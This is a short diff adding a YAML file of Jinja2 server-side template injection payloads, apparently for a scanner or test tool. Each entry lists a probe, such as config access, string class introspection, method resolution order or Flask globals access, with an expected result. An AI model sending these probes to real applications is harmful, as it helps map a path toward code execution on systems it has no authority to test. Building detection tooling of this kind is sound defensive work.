@@ -1,0 +1,18 @@
+# Jinja2-specific SSTI payloads
+engine: jinja2
+payloads:
+  - value: "{{config}}"
+    expected: "error"
+    description: "Config object access (error-based detection)"
+
+  - value: "{{''.__class__}}"
+    expected: "str"
+    description: "String class introspection"
+
+  - value: "{{''.__class__.__mro__}}"
+    expected: "tuple"
+    description: "Method resolution order"
+
+  - value: "{{request.application.__globals__}}"
+    expected: "error"
+    description: "Flask globals access attempt"
